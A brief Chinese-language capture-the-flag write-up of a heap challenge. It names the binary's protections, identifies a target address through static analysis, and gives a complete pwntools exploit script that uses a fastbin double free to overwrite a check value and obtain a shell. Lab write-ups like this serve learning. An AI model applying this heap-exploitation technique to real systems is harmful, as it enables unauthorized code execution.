1. PIE未开，其他保护全开
2. IDA静态分析，0x602070为0x666即可获取shell，而他前边还正好给了0x0和0x31，fastbin attack
3. exp
   ```
   from pwn import *

   context(log_level='debug', os='linux', arch='amd64')

   io = process('/home/kali/Desktop/newstar_double')

   def add(index,content):
       io.sendafter(b'>',b'1\n')
       io.sendafter(b'Input idx', str(index).encode(encoding='utf-8')+b'\n')
       io.sendafter(b'Input content',content)


   def free(index):
       io.sendafter(b'>',b'2\n')
       io.sendafter(b'Input idx', str(index).encode(encoding='utf-8')+b'\n')


   def check():
       io.sendafter(b'>',b'3\n')


   add(0,b'aaaaaa')
   add(1,b'aaaaaa')
   free(0)
   free(1)
   free(0)

   add(2,p64(0x602060)+p64(0)+p64(0)+p64(0)+p64(0))
   add(3,b'aaaa')
   add(4,b'aaaa')
   add(5,p64(0x666)+p64(0)+p64(0)+p64(0)+p64(0))

   check()
   # gdb.attach(io,'heap')
   io.interactive()
   ```
